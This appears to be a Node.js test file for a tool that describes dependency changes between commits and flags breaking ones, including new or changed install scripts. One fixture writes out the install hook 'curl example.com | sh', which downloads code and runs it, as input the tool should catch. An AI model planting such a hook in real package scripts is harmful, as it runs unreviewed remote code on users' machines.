import assert from 'node:assert/strict'
import { test } from 'node:test'

import { describeDependencies } from './verify-describe-dependencies.mjs'
import { envelopeFor, gitFixture, runDescriberScript } from './verify-git-fixture.mjs'

const MODULE = new URL('./verify-describe-dependencies.mjs', import.meta.url)

const pkg = (deps, scripts) =>
  JSON.stringify({ name: 'app', version: '1.0.0', scripts, dependencies: deps }, null, 2) + '\n'

function change(t, before, after) {
  const repo = gitFixture(t)
  repo.write(before)
  const base = repo.commit('base')
  repo.write(after)
  const head = repo.commit('head')
  return runDescriberScript(MODULE, envelopeFor(repo.dir, base, head, 'dependencies'), repo.dir)
}

test('a major bump is breaking', (t) => {
  const result = change(
    t,
    { 'package.json': pkg({ react: '18.3.1' }) },
    { 'package.json': pkg({ react: '19.0.0' }) },
  )
  assert.equal(result.breaking, true)
  assert.ok(result.items.some((item) => item.includes('react') && item.includes('19.0.0')))
})

test('minor and patch bumps are not breaking and are counted by level', (t) => {
  const result = change(
    t,
    { 'package.json': pkg({ a: '^1.2.0', b: '2.0.1', c: '3.1.0' }) },
    { 'package.json': pkg({ a: '^1.3.0', b: '2.0.2', c: '3.1.4', d: '1.0.0' }) },
  )
  assert.equal(result.breaking, false)
  assert.ok(result.items.some((item) => item.includes('1 minor') && item.includes('2 patch')))
  assert.ok(result.items.some((item) => item.includes('d')))
})

test('go.mod and requirements bumps are read from the patch', (t) => {
  const result = change(
    t,
    {
      'go.mod': 'module m\n\nrequire example.com/lib v1.4.0\n',
      'requirements.txt': 'requests==2.31.0\n',
    },
    {
      'go.mod': 'module m\n\nrequire example.com/lib v1.5.0\n',
      'requirements.txt': 'requests==3.0.0\n',
    },
  )
  assert.equal(result.breaking, true)
  assert.ok(result.items.some((item) => item.includes('requests')))
})

test('a new or changed install script in package.json is breaking', (t) => {
  for (const [before, after] of [
    [undefined, { postinstall: 'node setup.js' }],
    [{ prepare: 'husky' }, { prepare: 'curl example.com | sh' }],
    ...['preprepare', 'postprepare', 'prepublish', 'dependencies'].map((name) => [
      { test: 'a' },
      { test: 'a', [name]: 'node hook.js' },
    ]),
  ]) {
    const result = change(
      t,
      { 'package.json': pkg({ a: '1.0.0' }, before) },
      { 'package.json': pkg({ a: '1.0.0' }, after) },
    )
    assert.equal(result.breaking, true, JSON.stringify(after))
  }
  const harmless = change(
    t,
    { 'package.json': pkg({ a: '1.0.0' }, { test: 'a' }) },
    { 'package.json': pkg({ a: '1.0.0' }, { test: 'b' }) },
  )
  assert.equal(harmless.breaking, false)
})

test('a lockfile package newly running an install script is breaking', (t) => {
  const lock = (flag) =>
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': { name: 'app' },
        'node_modules/esbuild': { version: '0.20.0', ...(flag ? { hasInstallScript: true } : {}) },
      },
    })
  assert.equal(
    change(t, { 'package-lock.json': lock(false) }, { 'package-lock.json': lock(true) }).breaking,
    true,
  )
  assert.equal(
    change(t, { 'package-lock.json': lock(true) }, { 'package-lock.json': lock(true) + '\n' })
      .breaking,
    false,
  )

  const pnpm = (flag) =>
    `lockfileVersion: '6.0'\n\npackages:\n\n  /esbuild@0.20.0:\n    resolution: {integrity: sha512-x}\n${flag ? '    requiresBuild: true\n' : ''}    dev: false\n`
  assert.equal(
    change(t, { 'pnpm-lock.yaml': pnpm(false) }, { 'pnpm-lock.yaml': pnpm(true) }).breaking,
    true,
  )
})

test('new transitive packages are counted and named, never breaking', (t) => {
  for (const [file, before, after, name] of [
    [
      'package-lock.json',
      JSON.stringify({ packages: { '': {}, 'node_modules/a': {} } }),
      JSON.stringify({
        packages: { '': {}, 'node_modules/a': {}, 'node_modules/a/node_modules/@scope/deep': {} },
      }),
      '@scope/deep',
    ],
    [
      'pnpm-lock.yaml',
      "lockfileVersion: '9.0'\n\npackages:\n\n  a@1.0.0:\n    resolution: {integrity: x}\n",
      "lockfileVersion: '9.0'\n\npackages:\n\n  a@1.0.0:\n    resolution: {integrity: x}\n\n  '@scope/deep@2.0.0':\n    resolution: {integrity: y}\n",
      '@scope/deep',
    ],
    [
      'go.sum',
      'example.com/a v1.0.0 h1:x=\n',
      'example.com/a v1.0.0 h1:x=\nexample.com/deep v0.1.0 h1:y=\n',
      'example.com/deep',
    ],
    [
      'Cargo.lock',
      '[[package]]\nname = "a"\nversion = "1.0.0"\n',
      '[[package]]\nname = "a"\nversion = "1.0.0"\n\n[[package]]\nname = "deep"\nversion = "0.1.0"\n',
      'deep',
    ],
    [
      'yarn.lock',
      'a@^1.0.0:\n  version "1.0.0"\n',
      'a@^1.0.0:\n  version "1.0.0"\n\n"deep@npm:^2.0.0":\n  version "2.0.0"\n',
      'deep',
    ],
  ]) {
    const result = change(t, { [file]: before }, { [file]: after })
    assert.equal(result.breaking, false, file)
    const listed = result.items.find((item) => item.startsWith('1 '))
    assert.ok(listed?.endsWith(`: ${name}`), `${file}: ${JSON.stringify(result.items)}`)
  }
})

test('a pnpm v9 lockfile adding packages notes that install scripts are unrecorded', (t) => {
  const lock = (version, extra) =>
    `lockfileVersion: '${version}'\n\npackages:\n\n  /a@1.0.0:\n    resolution: {integrity: x}\n${extra}`
  const grow = (version) =>
    change(
      t,
      { 'pnpm-lock.yaml': lock(version, '') },
      { 'pnpm-lock.yaml': lock(version, '\n  /deep@2.0.0:\n    resolution: {integrity: y}\n') },
    )
  const recorded = grow('6.0')
  const unrecorded = grow('9.0')
  assert.equal(unrecorded.breaking, false)
  assert.equal(unrecorded.items.length, recorded.items.length + 1, JSON.stringify(unrecorded))
  const unchanged = change(
    t,
    { 'pnpm-lock.yaml': lock('9.0', '') },
    { 'pnpm-lock.yaml': lock('9.0', '') + '\n' },
  )
  assert.equal(unchanged.items.length, 0, JSON.stringify(unchanged))
})

test('an unsupported lockfile gets the not-inspected item', (t) => {
  const repo = gitFixture(t)
  repo.write({ 'Gemfile.lock': 'GEM\n' })
  const base = repo.commit()
  repo.write({ 'Gemfile.lock': 'GEM\n  specs:\n' })
  const head = repo.commit()
  const result = describeDependencies(envelopeFor(repo.dir, base, head, 'dependencies'), {
    cwd: repo.dir,
  })
  assert.equal(result.items.length, 1)
  assert.ok(result.items[0].includes('Gemfile.lock'))
  assert.equal(result.breaking, false)
})
